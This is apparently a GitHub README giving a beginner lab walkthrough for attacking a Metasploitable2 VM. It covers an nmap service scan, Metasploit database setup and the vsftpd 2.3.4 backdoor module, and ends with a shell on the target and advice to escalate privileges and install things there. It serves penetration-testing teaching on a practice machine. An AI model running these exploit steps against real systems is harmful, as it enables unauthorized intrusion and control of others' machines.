# attack-simulation-ethical-hacking-
This repository explains what people mean when they talk about “hacking a system” or “running commands on a remote host” in the context of cybersecurity, and it teaches those concepts responsibly. It’s not a how-to for illegal activity — it’s a structured, legal learning path for students, defenders, and aspiring penetration testers.

**Legal & ethical notice (must read)**
All content in this repository is intended for educational use on systems you own or have explicit written permission to test. Unauthorized access to computers or networks is illegal. Do not use these techniques against third-party systems without a signed Rules of Engagement. Contributors must follow the repo’s Code of Conduct and the ethical guidelines.

**(1) Find the target ip addresss**
Make sure you get your target ip address available. i,m so sure that you most have gotten ready the ip you want to target. If you dont have, you can get one through metasploitable2 vm. Also, you can use your other ip device for save practise. NOTE!, for this tutorial, i will use 192.168.*.*

**(2) Service + version scan**
On your kali vm, run the command below to scan for open port, service, and version

nmap -sV -p- -A 192.168.*.*

Screenshot1.png

**(3) Run the command below to install mestasploit console**

sudo apt install --reinstall metasploit-framework -y

After installing metasploit, run the command below to lounch metasploit:

msfconsole


**(3)scan result to metasploit data base (DB)**

db_nmap -sV -p- 192.168.*.*

The above command will import the target scanned result to metasploit database. If the above command is not connecting, no connection, it means metasploit 
(postgresql) is not running. To fix it start "postgresql" by running the below command:

sudo systemctl start postgresql

<img width="960" height="47" alt="image" src="https://github.com/user-attachments/assets/2a25a234-affd-4908-94aa-6dce128f521e" />


To initialize/create or check if its has been configured, run:

sudo msfdb init

<img width="960" height="124" alt="image" src="https://github.com/user-attachments/assets/35936fd6-8559-435b-a0da-4c052c5e3539" />


**Relunch your metasploit** 
Open a new terminal run the below command to relunch your metasploit console:

msfconsole

<img width="960" height="284" alt="image" src="https://github.com/user-attachments/assets/23d02eaa-31c4-49c5-af50-60cc010f6ca7" />


Then run the command below to confirm your connection. You should see "connected to msf postgresql:

db_status

<img width="746" height="36" alt="image" src="https://github.com/user-attachments/assets/b10be165-fd83-4bd6-baba-1dbf5d64ce20" />


Then rerun the below command to import the targeted scaned result to metasploit database:

db_nmap -sV -p- 192.168.*.*

<img width="960" height="350" alt="image" src="https://github.com/user-attachments/assets/6e390815-8e21-4c0c-8af3-83358898a802" />

Note: We are using por21 ftp version vsftp as our backdoor to gain access to the targeted device/get a module. run:

search vsftpd

<img width="960" height="125" alt="image" src="https://github.com/user-attachments/assets/36945b12-824e-452d-bc60-2815984d6f4a" />

From the option below on the screenshot, choose 1. run:

info 1

<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/a3b52fe9-0839-4b6e-ab86-f85aeb8e036d" />

run command:

use exploit/unix/ftp/vsftpd_234_backdoor

<img width="960" height="45" alt="image" src="https://github.com/user-attachments/assets/8c1c742f-baab-4d94-b5dd-cd9dc4e60cf7" />


run:
set RHOST 192.168.*.*

run:
set RPORT 21

run:
set PAYLOAD cmd/unix/interact

run:
show options

run:

run

<img width="960" height="322" alt="image" src="https://github.com/user-attachments/assets/ee2476e6-9931-44e4-8af9-5be36ba2ffab" />


When you check the last output you will noticed that we have gotten a shell. That means you are in your target device. You now have access to go through your target directories and escalate previledges. 

To confirm quickly run:
ifconfig
whoami
ls
and navigate round your target directories, modify edit and install to your target machine through the backdoor.
